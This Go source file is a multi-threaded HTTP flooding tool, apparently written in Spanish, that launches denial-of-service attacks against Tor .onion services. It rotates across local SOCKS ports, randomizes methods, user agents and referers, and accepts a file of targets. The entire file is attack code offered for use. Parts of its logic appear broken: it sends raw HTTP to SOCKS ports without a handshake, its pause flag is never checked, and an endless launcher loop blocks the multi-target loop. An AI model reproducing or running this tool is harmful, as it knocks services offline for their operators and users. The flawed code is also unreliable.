package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	onionHost    string
	maxThreads   int
	socksPorts   []int
	portIdx      int
	activeThreads int
	lock         sync.Mutex
	PORT         = 80
	ataquesEnviados int
	erroresConn     int
	logFile         *os.File
	objetivos       []string
	pausado         bool
	statsPorPuerto  = make(map[int]int)
	reintentosMax   = 3
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1",
	"python-requests/2.31", "Go-http-client/1.1", "libwww-perl/6.66",
}
var referers = []string{
	"http://duckduckgo.com", "http://protonmail.com",
	"http://facebookcorewwwi.onion", "http://torproject.org",
}
var metodos = []string{"GET", "POST", "HEAD", "OPTIONS", "TRACE"}

func siguienteSocks() int {
	lock.Lock()
	defer lock.Unlock()
	port := socksPorts[portIdx%len(socksPorts)]
	portIdx++
	return port
}

func generarPayload() string {
	metodo := metodos[rand.Intn(len(metodos))]
	ruta := fmt.Sprintf("/multi/%d", rand.Intn(90000)+10000)
	ua := userAgents[rand.Intn(len(userAgents))]
	ref := referers[rand.Intn(len(referers))]
	headers := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferer: %s\r\nAccept-Encoding: gzip, deflate\r\nX-Martillazo-Multi: %d\r\nConnection: keep-alive\r\n",
		metodo, ruta, onionHost, ua, ref, rand.Intn(999999)+1)
	if metodo == "POST" {
		body := fmt.Sprintf("multi=%d&data=%s", rand.Intn(999999)+1, strings.Repeat("B", rand.Intn(251)+50))
		headers += fmt.Sprintf("Content-Length: %d\r\n\r\n%s", len(body), body)
	} else {
		headers += "\r\n"
	}
	return headers
}

func logAtaque(msg string) {
	if logFile != nil {
		logFile.WriteString(fmt.Sprintf("%s [%s]\n", time.Now().Format(time.RFC3339), msg))
	}
}

func martillazo(port int) {
	defer func() {
		lock.Lock()
		activeThreads--
		lock.Unlock()
	}()
	var err error
	for intento := 0; intento < reintentosMax; intento++ {
		conn, errDial := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 8*time.Second)
		if errDial != nil {
			lock.Lock()
			erroresConn++
			lock.Unlock()
			logAtaque(fmt.Sprintf("Error conexión (intento %d): %v", intento+1, errDial))
			time.Sleep(1 * time.Second)
			err = errDial
			continue
		}
		conn.SetDeadline(time.Now().Add(8 * time.Second))
		payload := generarPayload()
		_, errWrite := conn.Write([]byte(payload))
		conn.Close()
		if errWrite != nil {
			lock.Lock()
			erroresConn++
			lock.Unlock()
			logAtaque(fmt.Sprintf("Error envío: %v", errWrite))
			err = errWrite
			continue
		}
		lock.Lock()
		ataquesEnviados++
		statsPorPuerto[port]++
		lock.Unlock()
		logAtaque(fmt.Sprintf("Ataque enviado por %d [%s]", port, time.Now().Format("15:04:05")))
		fmt.Printf("[%s] Ataque #%d por %d\n", time.Now().Format("15:04:05"), ataquesEnviados, port)
		break
	}
	if err != nil {
		fmt.Printf("[!] Error persistente al enviar ataque: %v\n", err)
	}
}

func lanzador() {
	for {
		lock.Lock()
		libres := maxThreads - activeThreads
		lock.Unlock()
		for i := 0; i < libres; i++ {
			port := siguienteSocks()
			lock.Lock()
			activeThreads++
			lock.Unlock()
			go martillazo(port)
		}
		time.Sleep(400 * time.Millisecond)
	}
}

func parsePorts(ports string) []int {
	parts := strings.Split(ports, ",")
	var res []int
	for _, p := range parts {
		if n, err := strconv.Atoi(strings.TrimSpace(p)); err == nil {
			res = append(res, n)
		}
	}
	return res
}

func cargarObjetivosDesdeArchivo(path string) []string {
	var lista []string
	f, err := os.Open(path)
	if err != nil {
		fmt.Println("No se pudo abrir el archivo de objetivos:", err)
		return lista
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lista = append(lista, line)
		}
	}
	return lista
}

func mostrarAyudaExtendida() {
	fmt.Println("Uso extendido:")
	fmt.Println("  -host <dominio.onion> [-t 1500] [-p 9055,9056,...]")
	fmt.Println("  -targets <archivo.txt>  (para múltiples objetivos)")
	fmt.Println("  -log <archivo>          (para registrar ataques)")
	fmt.Println("  -help                   (muestra esta ayuda)")
}

func main() {
	var ports string
	var logPath string
	var targetsFile string
	var showHelp bool
	flag.StringVar(&onionHost, "host", "", "Dominio .onion v3")
	flag.IntVar(&maxThreads, "t", 1500, "Hilos máximos")
	flag.StringVar(&ports, "p", "9055,9056,9057,9058,9059,9060", "Puertos Tor separados por coma")
	flag.StringVar(&logPath, "log", "", "Archivo para registrar ataques (opcional)")
	flag.StringVar(&targetsFile, "targets", "", "Archivo con lista de objetivos .onion")
	flag.BoolVar(&showHelp, "help", false, "Mostrar ayuda extendida")
	flag.Parse()
	if showHelp {
		mostrarAyudaExtendida()
		os.Exit(0)
	}
	if targetsFile != "" {
		objetivos = cargarObjetivosDesdeArchivo(targetsFile)
	} else if onionHost != "" {
		objetivos = []string{onionHost}
	}
	if len(objetivos) == 0 {
		fmt.Println("Debes especificar al menos un objetivo con -host o -targets")
		os.Exit(1)
	}
	socksPorts = parsePorts(ports)
	if onionHost == "" || len(socksPorts) == 0 {
		fmt.Println("Uso: go run martillazo_alpha_multi.go -host <dominio.onion> [-t 1500] [-p 9055,9056,...]")
		os.Exit(1)
	}
	if logPath != "" {
		var err error
		logFile, err = os.Create(logPath)
		if err != nil {
			fmt.Println("No se pudo crear el archivo de log:", err)
		}
		defer logFile.Close()
	}
	fmt.Printf("\n🚀 martillazo_alpha_multi.go cargando contra %s\n", onionHost)
	fmt.Printf("🔁 Rotando entre puertos: %v | Hilos máx: %d\n\n", socksPorts, maxThreads)
	c := make(chan os.Signal, 1)
	go func() {
		<-c
		fmt.Printf("\n\n[Resumen] Ataques enviados: %d | Errores de conexión: %d\n", ataquesEnviados, erroresConn)
		if logFile != nil {
			fmt.Println("[+] Log guardado en:", logPath)
		}
		os.Exit(0)
	}()
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print("[PAUSA/ESTAD] Escribe 'p' para pausar/reanudar, 's' para estadísticas: ")
			txt, _ := reader.ReadString('\n')
			txt = strings.TrimSpace(txt)
			if txt == "p" {
				pausado = !pausado
				if pausado {
					fmt.Println("Ataque pausado.")
				} else {
					fmt.Println("Ataque reanudado.")
				}
			}
			if txt == "s" {
				lock.Lock()
				fmt.Printf("[ESTAD] Ataques enviados: %d | Errores: %d | Hilos activos: %d\n", ataquesEnviados, erroresConn, activeThreads)
				lock.Unlock()
			}
		}
	}()
	for _, objetivo := range objetivos {
		onionHost = objetivo
		fmt.Printf("\n[🚀] Atacando objetivo: %s\n", onionHost)
		lanzador()
		fmt.Printf("[Resumen objetivo %s] Ataques: %d | Errores: %d\n", onionHost, ataquesEnviados, erroresConn)
		for port, count := range statsPorPuerto {
			fmt.Printf("  - Puerto %d: %d ataques\n", port, count)
		}
		ataquesEnviados, erroresConn = 0, 0
		statsPorPuerto = make(map[int]int)
	}
}
